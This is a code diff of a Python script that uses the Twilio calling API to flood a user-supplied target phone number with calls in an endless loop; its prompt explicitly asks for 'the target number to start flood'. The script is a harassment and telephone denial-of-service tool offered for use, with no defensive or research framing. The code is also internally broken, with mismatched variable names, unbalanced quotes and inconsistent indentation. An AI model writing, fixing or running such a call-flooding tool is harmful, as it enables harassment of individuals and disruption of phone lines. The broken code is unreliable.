@@ -7,23 +7,24 @@ import settings.local
 
 
 # Check initialization:
-    # Not using default twilio account
-    # a target has been provided
+#  * Not using default twilio account
+#  * a target has been provided
+#      * TODO: Regex to verify correct format?
+#      * Optional: If one has not been provided in the settings, ask the user for input?
+#      * Optional: If any of the settings are set to defaults, kick the user out with instructions
+#  * We have a message to send
 
-
-client = Client(accountSid, authtoken)
-
-call = client.calls.create(to="9991231234",
-                           from_="9991231234",
-                           url=twilioXMLPayload)
-print(call.sid)
 
 
 def makecalls():
-    while true:
+    while True:
+
+        # Use the target provided in the settings file, else ask the user to provide one:
             # Ask the user for a phone number to target:
         target = input('Enter the target number to start flood (+1 MUST BE IN FRONT!):')
-        new_call = client.calls.create(to='XXXX', from_='YYYY', method='GET')
+        new_call = client.calls.create(to=targetnum, from_='YYYY', url=twilioXMLPayload)
+        print('Started call to :" + targetnum + " from: " + FromNumber')
+        # TODO: Catch errors from bad numbers here
 
 if __name__ == '__main__':
     makecalls()
